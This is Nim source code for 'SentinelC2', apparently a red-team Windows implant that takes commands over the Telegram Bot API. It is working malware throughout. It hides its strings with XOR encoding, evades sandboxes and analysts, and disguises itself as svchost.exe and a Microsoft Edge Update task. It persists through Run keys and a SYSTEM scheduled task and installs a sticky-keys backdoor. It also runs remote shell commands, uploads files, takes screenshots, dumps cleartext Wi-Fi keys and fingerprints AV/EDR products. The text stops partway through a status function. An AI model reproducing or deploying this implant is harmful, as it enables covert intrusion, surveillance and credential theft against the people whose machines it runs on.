# =============================================================================
# agent_telegram.nim
#
# SentinelC2 "Telegram" variant - single-file Windows implant that uses the
# Telegram Bot API as its C2 channel. Same operator workflow as the WebSocket
# agent.nim, but the C2 transport is the public Telegram Bot API: no custom
# server, no VPS, no port-forward, no IP exposure. The agent long-polls
# getUpdates over HTTPS and sends output via sendMessage / sendDocument.
#
# Target: Windows 10/11 laptop, no EDR (out-of-scope per engagement brief).
# IAT (built with -d:ssl): KERNEL32, USER32, msvcrt, Ws2_32, Bcrypt,
#                          libssl-1_1-x64, libcrypto-1_1-x64, plus the
#                          SSLeay/OpenSSL legacy compat libs.
# The two lib* DLLs are bundled next to agent_telegram.exe by
# build_telegram.ps1 — the agent will not start without them.
# No ntdll, no amsi.
#
# Build:
#   .\build_telegram.ps1 -BotToken "123:ABC..." -ChatId "-100..." -Output agent_telegram.exe
#
# Manual build (if you don't want the wrapper):
#   nim c -d:release --opt:size --app:gui --passL:-s ^
#        --define:BOT_TOKEN="123:ABC..." --define:CHAT_ID="-100..." ^
#        agent_telegram.nim
#
# Runtime env vars (override the build-time defaults):
#   TELEGRAM_BOT_TOKEN   bot API token           (overrides baked-in)
#   TELEGRAM_CHAT_ID     target chat id          (overrides baked-in)
#   TELEGRAM_PROXY       http://host:port proxy  (optional)
#   C2_POLL_INTERVAL     base poll secs          (default 3, min 1)
#   C2_POLL_TIMEOUT      long-poll HTTP timeout  (default 30, min 5)
#   C2_LOG_FILE          path to debug log       (default: disabled)
#   C2_NO_PERSIST        1 to skip first-run persistence install
#   C2_NO_SANDBOX_CHECK  1 to skip the cheap anti-analysis checks
#   C2_INSTALL_DIR       override install path   (default %ProgramData%\...)
#   C2_INSTALL_NAME      override install name   (default svchost.exe)
#
# See README.md for the full operator command set and deploy instructions.
# =============================================================================

import std/[strutils, json, os, times, random, base64,
            tables, strformat, uri, httpclient, osproc, streams, options,
            monotimes, sequtils, typedthreads, atomics]
import winim/lean
import winim/inc/[winbase, shellapi]

# =============================================================================
# Compile-time configuration
# =============================================================================
const
  BuildPrefix*  = "X7K"        # matches the rest of SentinelC2
  AgentVersion* = "1.0.0"
  PollLongTimeout = 30         # seconds; how long getUpdates will block
  TgChunkLimit   = 4000        # Telegram hard limit is 4096; leave headroom
  MaxOutputBytes = 500_000     # cap on shell command output

  # Install layout - looks like a Windows networking component.
  InstallDir*  = r"C:\ProgramData\Microsoft\Network\Connections\Cm"
  InstallName* = "svchost.exe"

  # Persistence identifiers - mimic a real Microsoft Edge Update task.
  PersistRunName*  = "MicrosoftEdgeUpdate"
  PersistTaskName* = "MicrosoftEdgeUpdateTaskMachine"

  # Default mutex - randomized per-build via build_telegram.ps1.
  DefaultMutex* = "Global\\MicrosoftEdgeUpdateTaskRuntime"

  # Sandbox / analyst detection list. Cheap checks only; EDR is out of scope.
  SuspiciousHosts = ["SANDBOX", "VIRUS", "MALWARE", "CUCKOO",
                     "ANALYSIS", "VBOX", "VMWARE", "VIRTTEST"]
  SuspiciousUsers = ["sandbox", "user", "currentuser", "maltest",
                     "virus", "analyst", "cuckoo"]
  SuspiciousProcs = ["wireshark.exe", "fiddler.exe", "procmon.exe",
                     "processhacker.exe", "autoruns.exe", "autorunsc.exe",
                     "tcpview.exe", "vmtoolsd.exe", "vboxservice.exe",
                     "vboxtray.exe", "xenservice.exe", "cuckoomon.exe"]

  # AV / EDR process list (light fingerprint for /av command).
  AvEdrProcs = ["msmpeng.exe", "mpcmdrun.exe", "nissrv.exe",
                "csfalconservice.exe", "csagent.exe",
                "sentinelagent.exe", "sentinelranger.exe",
                "cb.exe", "cbcomms.exe", "carbonblack.exe",
                "ccsvchst.exe", "smc.exe", "pccntmon.exe", "tmlisten.exe",
                "savservice.exe", "sophoshealth.exe",
                "mbam.exe", "mbamtray.exe", "mbamservice.exe"]

  # Telegram Bot API base. The token and chat id are XOR-encoded at the
  # bottom of the file as S_BOT_TOKEN / S_CHAT_ID, decoded at runtime.
  ApiPathRoot = "https://api.telegram.org"

# =============================================================================
# Per-build XOR key for string obfuscation
# -----------------------------------------------------------------------------
# build_telegram.ps1 writes a xorkey.nim include with a fresh 16-byte
# key before each compile. We use `include` directly instead of
# gating it with `staticExec` because the staticExec CWD doesn't
# reliably match the source directory on all platforms/shells, and
# a silent fallback to the hardcoded key while the encoded bytes
# were XOR'd with the per-build key is a one-way trip to garbage
# decoded values and an opaque IndexDefect at startup. If xorkey.nim
# is missing, the compile fails loudly with a clear error message,
# which is what we want.
# =============================================================================
include "xorkey.nim"
static:
  doAssert XorKey.len == 16,
    "xorkey.nim must define a 16-byte XorKey for telegram builds"

# =============================================================================
# Obfuscation helpers
# -----------------------------------------------------------------------------
# String literals that are sensitive (or just signatured) live in the
# binary as XOR-encoded byte sequences. The runtime decoder is a 3-line
# proc; the strings never appear in .rdata in their cleartext form.
# =============================================================================
proc encodeObf(s: string): seq[byte] =
  result = newSeq[byte](s.len)
  for i in 0..<s.len:
    result[i] = byte(ord(s[i])) xor XorKey[i mod 16]

proc obfDec(v: openArray[byte]): string =
  result = newString(v.len)
  for i in 0..<v.len: result[i] = chr(int(v[i] xor XorKey[i mod 16]))

# Convenience template - decodes once at the call site.
template obfStr(v: openArray[byte]): string = obfDec(v)

# =============================================================================
# Obfuscated string constants
# -----------------------------------------------------------------------------
# All sensitive or signatured strings are stored XOR-encoded. The
# cleartext never appears in the binary. Replace these with the operator's
# bot token / chat id before building.
#
# build_telegram.ps1 does the encoding at build time. For a manual
# build, run this once in a Nim repl:
#   encodeObf("123456:AAH-real-token-here")
# and paste the result as the byte array below.
# =============================================================================
const
  S_BOT_TOKEN = [byte 0x00]   # placeholder - replaced at build time
  S_CHAT_ID   = [byte 0x00]   # placeholder - replaced at build time
  S_MUTEX     = [byte 0x00]   # placeholder - replaced at build time

# Common signatured strings we'd rather not leave in .rdata. Most are only
# referenced inside PowerShell scripts that are constructed at runtime.
const
  S_PERSIST_RUN = encodeObf(r"Software\Microsoft\Windows\CurrentVersion\Run")
  S_POWERSHELL  = encodeObf("powershell.exe")

# =============================================================================
# Runtime configuration - resolved from env vars with compile-time fallbacks
# =============================================================================
proc resolveBotToken(): string =
  ## Bot token: env var > baked-in (XOR-decoded) > placeholder.
  let env = getEnv("TELEGRAM_BOT_TOKEN", "")
  if env.len > 0: return env
  let baked = obfStr(S_BOT_TOKEN)
  if baked.len > 0 and baked != "0": return baked
  return "REPLACE_AT_BUILD_TIME"

proc resolveChatId(): string =
  let env = getEnv("TELEGRAM_CHAT_ID", "")
  if env.len > 0: return env
  let baked = obfStr(S_CHAT_ID)
  if baked.len > 0 and baked != "0": return baked
  return "0"

proc resolveMutex(): string =
  let env = getEnv("C2_MUTEX_NAME", "")
  if env.len > 0: return env
  let baked = obfStr(S_MUTEX)
  if baked.len > 0 and baked != "0": return baked
  return DefaultMutex

proc resolveIntEnv(name: string, default, minVal: int): int =
  let v = getEnv(name, "")
  if v.len > 0:
    try:
      let n = parseInt(v)
      return max(n, minVal)
    except: discard
  return default

proc resolveInstallDir(): string =
  let v = getEnv("C2_INSTALL_DIR", "")
  if v.len > 0: return v
  return InstallDir

proc resolveInstallName(): string =
  let v = getEnv("C2_INSTALL_NAME", "")
  if v.len > 0: return v
  return InstallName

# =============================================================================
# Runtime state (resolved once, then cached)
# =============================================================================
let
  BotToken    = resolveBotToken()
  ChatId      = resolveChatId()
  MutexName   = resolveMutex()
  ProxyUrl    = getEnv("TELEGRAM_PROXY", "")
  PollBaseMs  = resolveIntEnv("C2_POLL_INTERVAL", 3000, 1000)
  PollHttpSec = resolveIntEnv("C2_POLL_TIMEOUT",  PollLongTimeout, 5)
  LogFilePath = getEnv("C2_LOG_FILE", "")
  NoPersist   = getEnv("C2_NO_PERSIST", "0") == "1"
  NoSandbox   = getEnv("C2_NO_SANDBOX_CHECK", "0") == "1"
  RuntimeInstallDir  = resolveInstallDir()
  RuntimeInstallName = resolveInstallName()
  ApiBase     = ApiPathRoot & "/bot" & BotToken
  UserAgent   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " &
                "AppleWebKit/537.36 (KHTML, like Gecko) " &
                "Chrome/126.0.0.0 Safari/537.36"

# -----------------------------------------------------------------
# Startup sanity check on the decoded values.
# -----------------------------------------------------------------
# A bad build (missing xorkey.nim during compile, partial placeholder
# replacement, env vars set to garbage) can produce a BotToken / mutex
# / chat id that is too short, too long, or contains characters that
# crash downstream code. Validate them BEFORE we hand them to
# CreateMutexW / HttpClient / PowerShell so a bad build fails loudly
# instead of with an opaque IndexDefect dialog.
proc looksLikeBotToken(s: string): bool =
  ## Real Telegram bot tokens are <digits>:<35-ish base64url chars>.
  ## E.g. "1234567890:AAEhBOweik6ad9JQB..."  Total length is 35-50.
  let colon = s.find(':')
  if colon < 1 or colon > 12: return false
  if s.len < 35 or s.len > 64: return false
  for ch in s:
    if not (ch.isAlphaNumeric or ch in {':', '-', '_'}): return false
  true

proc looksLikeChatId(s: string): bool =
  ## A chat id is an integer (possibly negative). After stringify it
  ## is just digits with an optional leading '-'. Range: -10^18..10^18.
  if s.len == 0 or s.len > 20: return false
  var i = 0
  if s[0] == '-': i = 1
  if i >= s.len: return false
  while i < s.len:
    if s[i] < '0' or s[i] > '9': return false
    inc i
  true

proc looksLikeMutex(s: string): bool =
  ## Mutex names can contain backslashes (Global\, Local\, or no
  ## prefix). Disallow the truly problematic chars: / : * ? " < > |
  ## (and control chars). Max length is 260 on Windows.
  if s.len == 0 or s.len > 260: return false
  for ch in s:
    if ch in {'/', ':', '*', '?', '"', '<', '>', '|'}: return false
    if ord(ch) < 0x20: return false
  true

proc logMsg(msg: string)  # forward decl - real def is in the Debug logger section below
proc runStartupSanityChecks() =
  ## Validate the baked-in / env-supplied values. Logs warnings instead
  ## of aborting — the operator still gets the "online" message, and
  ## any bad values show up as clear 4xx responses from Telegram.
  if not looksLikeBotToken(BotToken):
    logMsg("WARN: BotToken does not look like a real Telegram bot token " &
           "(len=" & $BotToken.len & ", value='" & BotToken & "'). " &
           "Did the build inject the right secret?")
  if not looksLikeChatId(ChatId):
    logMsg("WARN: ChatId is not a valid integer string " &
           "(len=" & $ChatId.len & ", value='" & ChatId & "')")
  if not looksLikeMutex(MutexName):
    logMsg("WARN: MutexName contains invalid chars or is wrong length " &
           "(len=" & $MutexName.len & ", value='" & MutexName & "')")

# Forward declarations: command handlers in the middle of the file call
# these procs, whose actual implementations sit later in the "Telegram
# HTTP client" section. Forward decls in Nim need to come BEFORE any
# call site.
proc sendMessage(text: string): bool
proc sendDocument(path: string, caption: string = ""): bool
proc downloadTelegramFile(fileId, saveTo: string): bool

# -----------------------------------------------------------------
# Periodic-screenshot watcher (background thread)
# -----------------------------------------------------------------
# This is what replaces the "screenshot on every click/scroll" request
# (which would DOS the agent against Telegram's 30 msg/sec global rate
# limit and get us flagged by EDR in seconds).
#
# /watch start 30  -> screenshot every 30 sec
# /watch start 5   -> every 5 sec (heavy; use sparingly)
# /watch stop      -> stop
# /watch           -> show status
# /watch count N   -> run for N shots then auto-stop
#
# Each shot is sent as a Telegram document with a timestamp caption,
# then the local PNG is deleted. Runs in a dedicated thread; the
# thread polls a shared atomic flag so the main poll loop can stop
# it cleanly on /exit, /selfdestruct, or Ctrl-C.
var
  watchActive: Atomic[bool]
  watchIntervalMs: int = 30000  # default 30 sec; settable via /watch
  watchMaxShots: int = -1       # -1 = run forever; otherwise cap
  watchShotsTaken: int = 0
  watchThread: Thread[void]

proc watchLoop() {.thread.} =
  ## Background loop. Sits in a tight sleep-then-shoot cycle until
  ## watchActive is flipped to false, or watchMaxShots is hit, or
  ## the main process exits.
  while watchActive.load:
    sleep(watchIntervalMs)
    if not watchActive.load: break
    if watchMaxShots > 0 and watchShotsTaken >= watchMaxShots:
      watchActive.store(false)
      break
    let stamp = now().format("yyyy-MM-dd HH:mm:ss")
    let tmp = getEnv("TEMP", getEnv("USERPROFILE", ".")) /
              (BuildPrefix & "_watch_" & $(getMonoTime().ticks div 1_000_000) & ".png")
    # Inline the screenshot capture so we don't have to import
    # cmdScreenshot (which is defined later and would create a
    # forward-decl cycle). Mirrors cmdScreenshot's PS exactly.
    let safeTmp = tmp.replace('\\', '/').replace("'", "''")
    let ps =
      "Add-Type -AssemblyName System.Windows.Forms;" &
      "Add-Type -AssemblyName System.Drawing;" &
      "$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;" &
      "$bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height;" &
      "$g = [System.Drawing.Graphics]::FromImage($bmp);" &
      "$g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size);" &
      "$bmp.Save('" & safeTmp & "', " &
      "[System.Drawing.Imaging.ImageFormat]::Png);" &
      "$g.Dispose(); $bmp.Dispose();"
    var sentOk = false
    try:
      discard execCmdEx(obfStr(S_POWERSHELL) &
        " -NoProfile -NonInteractive -Command \"" & ps & "\"",
        {poStdErrToStdOut, poUsePath})
      if fileExists(tmp):
        sentOk = sendDocument(tmp, "watch @ " & stamp)
        try: removeFile(tmp) except: discard
    except CatchableError: discard
    if sentOk:
      inc watchShotsTaken

# Mutable poll-loop state. Declared up here so the command handlers
# (defined later) can see them.
var
  agentStart  = getMonoTime()
  pollsTotal  = 0
  pollsOk     = 0
  lastPollOk: int64 = 0  # millis
  lastPollErr = ""

# =============================================================================
# Debug logger
# -----------------------------------------------------------------------------
# Silent unless C2_LOG_FILE is set. The agent never touches the registry
# or filesystem for logging unless the operator explicitly turns it on.
# =============================================================================
proc logMsg(msg: string) =
  ## Append a line to LogFilePath. Silent if logging disabled.
  if LogFilePath.len == 0: return
  try:
    let dir = LogFilePath.parentDir()
    if dir.len > 0: createDir(dir)
    let f = open(LogFilePath, fmAppend)
    defer: f.close()
    f.writeLine("[" & now().format("yyyy-MM-dd HH:mm:ss") & "] " & msg)
  except: discard

# =============================================================================
# Sandbox / analyst heuristics (cheap, low-cost)
# -----------------------------------------------------------------------------
# These exist to deter a casual analyst who fires up the binary in a
# default sandbox (VirusTotal, ANY.RUN, etc.). A real EDR-equipped host
# is out of scope per the engagement brief.
# =============================================================================
proc isSandbox(): bool =
  if NoSandbox: return false
  try:
    let cn = getEnv("COMPUTERNAME", "").toUpperAscii
    for s in SuspiciousHosts:
      if cn.contains(s): return true
    let un = getEnv("USERNAME", "").toLowerAscii
    if un in SuspiciousUsers: return true
    # Random jitter to slip past time-based sandboxes
    sleep(rand(1500))
  except: discard
  return false

# =============================================================================
# Single-instance mutex
# -----------------------------------------------------------------------------
# CreateMutexW returns ERROR_ALREADY_EXISTS if another instance is
# already holding the mutex. The agent bails silently in that case -
# the next scheduled-task / Run-key fire will pick up the slack.
# =============================================================================
const ERROR_ALREADY_EXISTS = 183

proc acquireMutex(): bool =
  ## Create a single-instance mutex. Tries the configured name first
  ## (which is typically in the Global\ namespace). If that fails for
  ## any reason other than "already held", falls back to a local-
  ## namespace version of the same name.
  ##
  ## The Global\ namespace requires SeCreateGlobalPrivilege, which
  ## most user accounts do NOT have. Without this fallback the agent
  ## would silently bail on every normal user session with no way to
  ## tell why. Local namespace is per-session, which is what we
  ## actually want for single-instance dedup.

  # First attempt: configured name (likely Global\...)
  let h1 = CreateMutexW(NULL, FALSE, MutexName)
  if h1 != 0:
    let err1 = GetLastError()
    if err1 == ERROR_ALREADY_EXISTS:
      CloseHandle(h1)
      return false  # another instance owns it
    return true      # we own it
  # First attempt returned NULL. Most common cause on user sessions:
  # access denied because Global\ needs a privilege we don't have.
  # Fall back to a local-namespace version.
  let localName = MutexName.replace("Global\\", "")
  if localName == MutexName or localName.len == 0:
    # No "Global\" prefix to strip (or it was the entire name). Both
    # attempts would behave identically — give up.
    return false
  let h2 = CreateMutexW(NULL, FALSE, localName)
  if h2 != 0:
    let err2 = GetLastError()
    if err2 == ERROR_ALREADY_EXISTS:
      CloseHandle(h2)
      return false
    return true
  return false

# =============================================================================
# System recon helpers
# =============================================================================
proc sysInfoJson(): JsonNode =
  ## Collects everything /sysinfo returns. Used both for the initial
  ## online ping and for /status.
  result = newJObject()
  try:
    result["user"]   = %getEnv("USERNAME", "?")
    result["host"]   = %getEnv("COMPUTERNAME", "?")
    result["domain"] = %getEnv("USERDOMAIN", "?")
    result["arch"]   = %getEnv("PROCESSOR_ARCHITECTURE", "?")
    result["pid"]    = %getCurrentProcessId()
    result["exe"]    = %getAppFilename()
    result["is_admin"] = %(IsUserAnAdmin() != 0)
    result["cwd"]    = %getCurrentDir()
    result["os"]     = %"Windows"
    # OS caption via WMI - non-fatal if it fails
    try:
      let (outp, _) = execCmdEx("wmic os get Caption,Version,BuildNumber /value")
      for line in outp.splitLines:
        let kv = line.split('=', 1)
        if kv.len == 2 and kv[0].strip.len > 0:
          result[kv[0].strip] = %kv[1].strip
    except: discard
    result["agent_version"] = %AgentVersion
    result["build_prefix"]  = %BuildPrefix
  except:
    result["error"] = %getCurrentExceptionMsg()

proc logicalDrives(): string =
  ## List logical drives via GetLogicalDrives + GetDriveTypeW.
  try:
    let bits = GetLogicalDrives().int
    var lines: seq[string] = @[]
    for i in 0..<26:
      if (bits and (1 shl i)) != 0:
        let letter = ($chr(ord('A') + i) & ":\\")
        let dtype = GetDriveTypeW(letter)
        let kind = case dtype
                   of 2: "removable"
                   of 3: "fixed"
                   of 4: "network"
                   of 5: "cdrom"
                   of 6: "ramdisk"
                   else: "?"
        lines.add(letter & " (" & kind & ")")
    if lines.len == 0: return "(no drives)"
    return lines.join("\n")
  except: return "error: " & getCurrentExceptionMsg()

# =============================================================================
# Persistence
# =============================================================================
proc currentLaunchCmd(): string =
  ## Build the command line we'd need to re-exec ourselves.
  ## Used by /persist to re-install the Run key.
  try:
    let exe = getAppFilename()
    return "\"" & exe & "\""
  except: return ""

proc installRunKey(): string =
  ## Add the Run key (HKCU + HKLM if admin). Returns a status line.
  let cmd = currentLaunchCmd()
  if cmd.len == 0: return "skipped (no exe path)"
  var script = ""
  script.add("New-ItemProperty -Path 'HKCU:\\" & obfStr(S_PERSIST_RUN) & "' ")
  script.add("-Name '" & PersistRunName & "' -Value \"" & cmd & "\" ")
  script.add("-PropertyType String -Force | Out-Null;\n")
  if IsUserAnAdmin() != 0:
    script.add("New-ItemProperty -Path 'HKLM:\\" & obfStr(S_PERSIST_RUN) & "' ")
    script.add("-Name '" & PersistRunName & "' -Value \"" & cmd & "\" ")
    script.add("-PropertyType String -Force | Out-Null;\n")
  let (outp, exitCode) = execCmdEx(obfStr(S_POWERSHELL) &
    " -NoProfile -NonInteractive -Command \"" & script & "\"")
  if exitCode != 0: return "err: exit " & $exitCode & " out: " & outp.strip[0..<min(200, outp.len)]
  return "ok"

proc installScheduledTask(): string =
  ## Create a SYSTEM-context scheduled task that fires on logon.
  if IsUserAnAdmin() == 0: return "skipped (not admin)"
  let cmd = currentLaunchCmd()
  if cmd.len == 0: return "skipped (no exe path)"
  let script =
    "$a = New-ScheduledTaskAction -Execute " & cmd & ";\n" &
    "$t = New-ScheduledTaskTrigger -AtLogOn;\n" &
    "$p = New-ScheduledTaskPrincipal -UserId 'SYSTEM' " &
      "-LogonType ServiceAccount -RunLevel Highest;\n" &
    "$s = New-ScheduledTaskSettingsSet " &
      "-AllowStartIfOnBatteries -DontStopIfGoingOnBatteries " &
      "-StartWhenAvailable -MultipleInstances IgnoreNew;\n" &
    "Register-ScheduledTask -TaskName '" & PersistTaskName & "' " &
      "-Action $a -Trigger $t -Principal $p -Settings $s -Force | Out-Null;\n" &
    "Write-Output 'ok'"
  let (outp, exitCode) = execCmdEx(obfStr(S_POWERSHELL) &
    " -NoProfile -NonInteractive -Command \"" & script & "\"")
  if exitCode != 0: return "err: exit " & $exitCode
  return "ok"

proc installStickyKeys(): string =
  ## Replace sethc.exe with cmd.exe - Shift 5x at the lock screen gives
  ## a SYSTEM shell, even before any user logs in. Backs up the original
  ## to sethc.exe.bak so /cleanup can restore it.
  if IsUserAnAdmin() == 0: return "skipped (not admin)"
  let script =
    "$bak = $env:SystemRoot + '\\System32\\sethc.exe.bak';\n" &
    "$cur = $env:SystemRoot + '\\System32\\sethc.exe';\n" &
    "$cmd = $env:SystemRoot + '\\System32\\cmd.exe';\n" &
    "if (-not (Test-Path $bak)) {\n" &
    "  takeown /f $cur /a | Out-Null;\n" &
    "  icacls $cur /grant Administrators:F | Out-Null;\n" &
    "  Copy-Item $cmd $bak -Force;\n" &
    "  Copy-Item $cmd $cur -Force;\n" &
    "} Write-Output 'ok'\n"
  let (outp, exitCode) = execCmdEx(obfStr(S_POWERSHELL) &
    " -NoProfile -NonInteractive -Command \"" & script & "\"")
  if outp.contains("ok"): return "ok (Shift 5x at lock screen)"
  return "err: exit " & $exitCode

proc ensurePersistenceAtStartup() =
  ## First-run best-effort persistence. Skipped if C2_NO_PERSIST=1.
  if NoPersist: return
  try:
    discard installRunKey()
    discard installScheduledTask()
  except: discard

proc removePersistence(): Table[string, string] =
  ## /cleanup and /selfdestruct both use this. Returns a status map.
  result = initTable[string, string]()
  # Run key
  var script =
    "Remove-ItemProperty -Path 'HKCU:\\" & obfStr(S_PERSIST_RUN) & "' " &
      "-Name '" & PersistRunName & "' -ErrorAction SilentlyContinue;\n"
  if IsUserAnAdmin() != 0:
    script.add("Remove-ItemProperty -Path 'HKLM:\\" & obfStr(S_PERSIST_RUN) &
               "' -Name '" & PersistRunName & "' -ErrorAction SilentlyContinue;\n")
  let (o1, e1) = execCmdEx(obfStr(S_POWERSHELL) &
    " -NoProfile -NonInteractive -Command \"" & script & "\"")
  result["run_key"] = if e1 == 0: "ok" else: "warn: exit " & $e1
  # Scheduled task
  if IsUserAnAdmin() != 0:
    let (o2, e2) = execCmdEx(obfStr(S_POWERSHELL) &
      " -NoProfile -NonInteractive -Command \"Unregister-ScheduledTask " &
      "-TaskName '" & PersistTaskName & "' -Confirm:$false -ErrorAction SilentlyContinue\"")
    result["task"] = if e2 == 0: "ok" else: "warn: exit " & $e2
  # Sticky keys: only restore if we installed (bak exists)
  if IsUserAnAdmin() != 0:
    let restore =
      "$bak = $env:SystemRoot + '\\System32\\sethc.exe.bak';\n" &
      "$cur = $env:SystemRoot + '\\System32\\sethc.exe';\n" &
      "if (Test-Path $bak) {\n" &
      "  takeown /f $cur /a | Out-Null;\n" &
      "  icacls $cur /grant Administrators:F | Out-Null;\n" &
      "  Copy-Item $bak $cur -Force;\n" &
      "  Remove-Item $bak -Force;\n" &
      "  Write-Output 'restored'\n" &
      "} else { Write-Output 'not-installed' }\n"
    let (o3, e3) = execCmdEx(obfStr(S_POWERSHELL) &
      " -NoProfile -NonInteractive -Command \"" & restore & "\"")
    result["stickykeys"] = o3.strip

# =============================================================================
# Command handlers
# -----------------------------------------------------------------------------
# Each handler is sync. They're called from the async dispatch loop.
# Output is plain text; long output is chunked before sendMessage.
# =============================================================================
proc chunkText(s: string, limit: int = TgChunkLimit): seq[string] =
  ## Split a long string into <= limit-char chunks, breaking on newlines
  ## where possible. Telegram hard limit is 4096; we use 4000 for safety.
  if s.len <= limit: return @[s]
  result = @[]
  var remaining = s
  while remaining.len > limit:
    var cut = limit
    let window = max(0, limit - 200)
    var nlPos = -1
    for i in countdown(limit - 1, window):
      if remaining[i] == '\n':
        nlPos = i
        break
    if nlPos > 0: cut = nlPos + 1
    result.add(remaining[0..<cut])
    remaining = remaining[cut..^1]
  if remaining.len > 0: result.add(remaining)

proc cmdHelp(): string =
  result =
    "SentinelC2 / Telegram - available commands:\n" &
    "/cmd <cmd>            run shell command (timeout 120s)\n" &
    "/upload <path>        upload file from target\n" &
    "/dl <file_id>         download file by Telegram file_id\n" &
    "/sysinfo              host, user, OS, network info\n" &
    "/screenshot           capture primary desktop\n" &
    "/ps                   process list (tasklist /v)\n" &
    "/kill <pid>           kill process\n" &
    "/ls [path]            list directory (default .)\n" &
    "/cat <file>           read first 4 KB of file\n" &
    "/cd <path>            change working directory\n" &
    "/pwd                  print working directory\n" &
    "/whoami               current user@host\n" &
    "/env [name]           env var (or all)\n" &
    "/drives               list logical drives\n" &
    "/ipconfig             ipconfig /all\n" &
    "/wifi                 saved wifi profiles + cleartext keys\n" &
    "/av                   check for AV/EDR processes\n" &
    "/persist              install Run key + scheduled task\n" &
    "/stickykeys           install sticky-keys backdoor (admin)\n" &
    "/status               health check (uptime, persistence, last poll)\n" &
    "/cleanup              remove all persistence (agent stays alive)\n" &
    "/watch [start N | count N [sec] | stop]   periodic screenshots every N sec\n" &
    "/selfdestruct         remove agent + all persistence + exit\n" &
    "/sleep <seconds>      sleep for N seconds\n" &
    "/exit                 kill the agent (persistence stays in place)"

proc cmdExec(command: string): string =
  if command.strip().len == 0: return "(empty command)"
  try:
    let (outp, exitCode) = execCmdEx(command, {poStdErrToStdOut, poUsePath})
    if outp.len == 0: return "(no output, exit " & $exitCode & ")"
    return outp[0..<min(MaxOutputBytes, outp.len)]
  except CatchableError as e:
    return "err: " & e.msg

proc cmdSysinfo(): string =
  try: return $sysInfoJson().pretty
  except: return "err: " & getCurrentExceptionMsg()

proc cmdLs(path: string): string =
  let p = if path.strip().len == 0: "." else: path.strip()
  try:
    var rows: seq[string] = @[]
    for kind, name in walkDir(p):
      if rows.len >= 500: break  # cap
      let full = p / name
      var size = "?"
      try:
        if kind == pcFile or kind == pcLinkToFile:
          size = $getFileSize(full)
        else:
          size = "<dir>"
      except: discard
      rows.add(size.align(14) & "  " & name)
    if rows.len == 0: return "(empty)"
    return rows.join("\n")
  except CatchableError as e: return "err: " & e.msg

proc cmdCat(path: string): string =
  if path.len == 0: return "usage: /cat <file>"
  try:
    let data = readFile(path)
    return data[0..<min(MaxOutputBytes, data.len)]
  except CatchableError as e: return "err: " & e.msg

proc cmdEnv(name: string): string =
  if name.len == 0:
    var lines: seq[string] = @[]
    for k, v in envPairs():
      lines.add(k & "=" & v)
    let joined = lines.join("\n")
    return joined[0..<min(MaxOutputBytes, joined.len)]
  return getEnv(name, "(not set)")

proc cmdWifi(): string =
  ## Saved Wi-Fi profiles + cleartext keys (admin).
  let ps =
    "$out = @()\n" &
    "$profiles = (netsh wlan show profiles) | " &
      "Select-String 'All User Profile' | " &
      "ForEach-Object { ($_ -split ':')[1].Trim() }\n" &
    "foreach ($p in $profiles) {\n" &
    "  $k = (netsh wlan show profile name=$p key=clear) | " &
      "Select-String 'Key Content'\n" &
    "  $key = if ($k) { ($k -split ':')[1].Trim() } else { '(no key)' }\n" &
    "  $out += \"$p : $key\"\n" &
    "}\n" &
    "$out -join \"`n\"\n"
  try:
    let (outp, _) = execCmdEx(obfStr(S_POWERSHELL) &
      " -NoProfile -NonInteractive -Command \"" & ps & "\"", {poStdErrToStdOut, poUsePath})
    if outp.len == 0: return "(no wifi profiles)"
    return outp[0..<min(MaxOutputBytes, outp.len)]
  except CatchableError as e: return "err: " & e.msg

proc cmdAv(): string =
  ## Quick scan for known AV/EDR processes (light fingerprint).
  var suspectSet = initTable[string, bool]()
  for s in AvEdrProcs: suspectSet[s] = true
  try:
    let (outp, _) = execCmdEx("tasklist /fo csv /nh", {poStdErrToStdOut, poUsePath})
    var hits: seq[string] = @[]
    for line in outp.splitLines:
      if line.len == 0: continue
      let parts = line.split('"')
      if parts.len < 2: continue
      let name = parts[1].toLowerAscii
      if suspectSet.hasKey(name): hits.add(name)
    if hits.len == 0: return "no common AV/EDR detected"
    return "AV/EDR hits: " & hits.join(", ")
  except CatchableError as e: return "err: " & e.msg

proc cmdScreenshot(): string =
  ## Capture the primary desktop via PowerShell + System.Drawing.
  let tmp = getEnv("TEMP", getEnv("USERPROFILE", ".")) / (BuildPrefix & "_shot.png")
  # PowerShell single-quoted literals escape ' by doubling it ('').
  # Apostrophes in user names (O'Neil, D'Angelo) would otherwise
  # terminate the literal and produce a syntax error.
  let safeTmp = tmp.replace('\\', '/').replace("'", "''")
  let ps =
    "Add-Type -AssemblyName System.Windows.Forms;" &
    "Add-Type -AssemblyName System.Drawing;" &
    "$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;" &
    "$bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height;" &
    "$g = [System.Drawing.Graphics]::FromImage($bmp);" &
    "$g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size);" &
    "$bmp.Save('" & safeTmp & "', " &
    "[System.Drawing.Imaging.ImageFormat]::Png);" &
    "$g.Dispose(); $bmp.Dispose();"
  try:
    let (_, exitCode) = execCmdEx(obfStr(S_POWERSHELL) &
      " -NoProfile -NonInteractive -Command \"" & ps & "\"", {poStdErrToStdOut, poUsePath})
    if not fileExists(tmp): return "screenshot failed (exit " & $exitCode & ")"
    return "@file:" & tmp
  except CatchableError as e: return "err: " & e.msg

proc cmdStatus(): string =
  var uptime = (getMonoTime() - agentStart).inSeconds
  let h = uptime div 3600
  let m = (uptime mod 3600) div 60
  let s = uptime mod 60
  # Persistence check via PowerShell (best effort, non-fatal)
  var runkey = "?"
  var task = "?"
  var stickey = "?"
  try:
    let ps =
      "(Get-ItemProperty -Path 'HKLM:\\" & obfStr(S_PERSIST_RUN) & "' " &
      "-Name '" & PersistRunName & "' -ErrorAction SilentlyContinue) -ne $null;\n" &
      "(Get-ScheduledTask -TaskName '" & PersistTaskName & "' " &
      "-ErrorAction SilentlyContinue) -ne $null;\n" &
      "Test-Path $env:SystemRoot\\System32\\sethc.exe.bak\n"
    let (outp, _) = execCmdEx(obfStr(S_POWERSHELL) &
      " -NoProfile -NonInteractive -Command \"" & ps & "\"", {poStdErrToStdOut, poUsePath})
    let parts = outp.splitLines
    if parts.len > 0: runkey  = (if parts[0].toLowerAscii == "true": "OK" else: "MISSING")
    if parts.len > 1: task    = (if parts[1].toLowerAscii == "true": "OK" else: "MISSING")
